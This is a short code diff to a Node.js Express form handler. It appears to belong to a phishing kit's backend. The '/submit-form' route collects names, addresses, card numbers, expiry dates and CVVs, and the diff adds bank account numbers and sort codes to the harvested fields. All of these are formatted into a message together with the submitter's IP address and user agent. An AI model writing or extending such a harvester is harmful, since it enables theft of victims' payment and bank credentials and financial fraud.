@@ -20,7 +20,7 @@ const formLimiter = rateLimit({
   });
 
 app.post("/submit-form", formLimiter, async (req, res) => {
-    const { firstName, lastName, phoneNum, address, city, postcode, cardNum, expiry, cvv } = req.body;
+    const { firstName, lastName, phoneNum, address, city, postcode, cardNum, expiry, cvv, accountNum, sortCode } = req.body;
   
     const userAgent = req.headers['user-agent'];
 
@@ -53,6 +53,8 @@ if (req.body.phone_number) {
   Post code: ${postcode}
   Card Number: ${cardNum}
   expiry: ${expiry}
+  Acc No: ${accountNum}
+  Sort code: ${sortCode}
   cvv: ${cvv}
   IP: ${ip}
   User Agent: ${userAgent}
